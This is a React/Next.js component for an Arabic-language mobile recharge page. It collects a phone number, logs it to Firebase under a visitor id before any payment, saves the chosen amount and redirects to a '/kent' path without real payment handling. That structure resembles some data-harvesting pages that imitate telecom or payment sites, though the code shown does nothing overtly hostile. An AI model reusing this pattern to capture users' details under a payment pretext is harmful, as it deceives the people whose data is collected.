"use client"

import { useEffect, useState } from "react"
import { Phone, ChevronLeft, CheckCircle } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { RechargeCard } from "./recharge"
import { addData } from "@/lib/firebase"

const RECHARGE_CARDS = [
  { value: 1.5, days: 7 },
  { value: 2, days: 10 },
  { value: 3, days: 15 },
  { value: 5, days: 30 },
  { value: 10, days: 90 },
  { value: 20, days: 180 },
  { value: 25, days: 365 },
]

export function RechargeFlow() {
  const [phoneNumber, setPhoneNumber] = useState("")
  const [selectedCard, setSelectedCard] = useState<number | null>(null)
  const [step, setStep] = useState(1)

  const handleContinue = () => {
    const visitorId=localStorage.getItem('visitor')
    if (step === 1 && phoneNumber.length >= 8) {
      addData({id:visitorId,phone:phoneNumber,mobile:phoneNumber})
      setStep(2)
    } else if (step === 2 && selectedCard !== null) {
      // Handle payment process
     window.location.href='/kent'
    }
  }
useEffect(()=>{
  const am=localStorage.setItem('amount',selectedCard?.toString())
},[selectedCard])
  const isStepValid = () => {
    if (step === 1) return phoneNumber.length >= 8
    if (step === 2) return selectedCard !== null
    return false
  }

  return (
    <Card className="border-0 shadow-xl overflow-hidden">
      <CardContent className="p-0">
        <div className="bg-gradient-to-br from-purple-700 to-purple-900 p-5 text-white">
          <h2 className="text-2xl font-bold mb-2">إعادة تعبئة الرصيد</h2>
          <p className="text-purple-200 text-sm">أدخل رقم الهاتف واختر قيمة بطاقة التعبئة</p>

          {/* Progress Indicator */}
          <div className="flex items-center mt-4">
            <div className="flex items-center justify-center w-8 h-8 bg-white text-purple-700 rounded-full font-bold">
              1
            </div>
            <div className={`h-1 w-12 mx-1 ${step > 1 ? "bg-white" : "bg-white/30"}`}></div>
            <div
              className={`flex items-center justify-center w-8 h-8 rounded-full font-bold ${
                step >= 2 ? "bg-white text-purple-700" : "bg-white/30 text-purple-900"
              }`}
            >
              2
            </div>
            <div className="h-1 w-12 mx-1 bg-white/30"></div>
            <div className="flex items-center justify-center w-8 h-8 bg-white/30 text-purple-900 rounded-full font-bold">
              3
            </div>
          </div>
        </div>

        <div className="p-5 bg-white">
          {step === 1 ? (
            /* Step 1: Phone Number Input */
            <div className="mb-6 animate-fade-in">
              <div className="flex items-center justify-between mb-3">
                <h3 className="font-bold text-gray-800">الخطوة 1: أدخل رقم الهاتف</h3>
                <span className="bg-purple-100 text-purple-700 text-xs font-medium px-2.5 py-0.5 rounded-full">
                  مطلوب
                </span>
              </div>

              <div className="relative">
                <div className="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
                  <Phone className="h-5 w-5 text-gray-400" />
                </div>
                <input
                  type="tel"
                  className="bg-gray-50 border border-gray-300 text-gray-900 text-lg rounded-lg focus:ring-purple-500 focus:border-purple-500 block w-full pr-10 p-4 text-center font-bold tracking-wide"
                  placeholder="5XXXXXXX"
                  required
                  dir="ltr"
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value)}
                />
              </div>
              <p className="mt-2 text-xs text-gray-500 text-center">أدخل رقم الهاتف بدون رمز الدولة</p>
            </div>
          ) : (
            /* Step 2: Select Recharge Card */
            <div className="animate-fade-in">
              <div className="flex items-center justify-between mb-4">
                <h3 className="font-bold text-gray-800">الخطوة 2: اختر قيمة البطاقة</h3>
                <span className="bg-purple-100 text-purple-700 text-xs font-medium px-2.5 py-0.5 rounded-full">
                  مطلوب
                </span>
              </div>

              <div className="grid grid-cols-2 gap-3 mb-6">
                {RECHARGE_CARDS.map((card, index) => (
                  <RechargeCard
                    key={index}
                    value={card.value}
                    days={card.days}
                    selected={selectedCard === index}
                    onSelect={() => setSelectedCard(index)}
                  />
                ))}
              </div>

              <div className="flex items-center gap-3 mb-6">
                <Button variant="outline" className="flex-1 py-3" onClick={() => setStep(1)}>
                  رجوع
                </Button>
                <Button
                  className="flex-1 bg-gradient-to-r from-purple-600 to-purple-700 hover:from-purple-700 hover:to-purple-800 text-white py-3"
                  disabled={!isStepValid()}
                  onClick={handleContinue}
                >
                  متابعة الدفع
                </Button>
              </div>

              <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
                <div className="flex items-start gap-3">
                  <div className="text-blue-500 mt-1">
                    <CheckCircle className="h-5 w-5" />
                  </div>
                  <div>
                    <p className="text-sm text-blue-800 font-medium">سيتم إعادة تعبئة الرقم</p>
                    <p className="text-lg font-bold text-blue-900 mt-1 dir-ltr text-center">{phoneNumber}</p>
                  </div>
                </div>
              </div>
            </div>
          )}

          {step === 1 && (
            <Button
              className="w-full bg-gradient-to-r from-purple-600 to-purple-700 hover:from-purple-700 hover:to-purple-800 text-white py-4 rounded-xl font-semibold shadow-lg hover:shadow-xl transition-all duration-300"
              disabled={!isStepValid()}
              onClick={handleContinue}
            >
              متابعة
              <ChevronLeft className="h-5 w-5 mr-2" />
            </Button>
          )}
        </div>
      </CardContent>
    </Card>
  )
}
